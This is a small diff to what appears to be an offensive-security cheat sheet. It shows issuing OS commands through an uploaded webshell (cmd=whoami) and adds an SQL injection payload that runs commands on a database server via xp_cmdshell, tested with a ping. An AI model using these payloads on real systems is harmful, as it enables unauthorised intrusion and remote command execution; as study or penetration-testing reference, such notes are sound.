@@ -45,5 +45,7 @@ Since the webshell is upload, you can go execute OS Commands:
 
 ```http://domain.com/webshell.php?cmd=whoami```
 
+## OS Command Execution
 
-
+Via **xp_cmdshell**:  
+```something'); exec xp_cmdshell "ping 10.10.x.x"--``` 
